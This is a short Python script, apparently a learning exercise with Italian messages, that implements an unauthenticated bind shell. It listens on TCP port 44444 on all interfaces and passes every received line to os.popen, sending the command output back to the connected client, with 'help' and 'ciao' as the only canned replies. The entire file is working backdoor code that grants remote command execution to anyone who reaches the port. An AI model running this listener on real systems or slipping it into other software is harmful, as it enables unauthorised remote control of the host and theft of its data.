import socket
import os


SRV_ADDR = ""
SRV_PORT = 44444

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((SRV_ADDR, SRV_PORT))
s.listen(1)
print(f"Sono in ascolto su: {SRV_PORT}")
connection, address = s.accept()
print(f"Si è collegato: {address}")

while True:
    output = os.popen("pwd").read().rstrip() + " $ "
    connection.sendall(output.encode("utf-8"))
    data = connection.recv(1024)
    if not data: 
        break
    cmd  = data.decode("utf-8").rstrip()
    if cmd == "help":
        connection.sendall("Esegui qualsiasi comando\n".encode("utf-8"))
    elif cmd == "ciao":
        connection.sendall(b"come stai?\n")
    else:
        output = os.popen(cmd).read() + "\n"
        connection.sendall(output.encode("utf-8"))
    print(data.decode("utf-8"))
connection.close()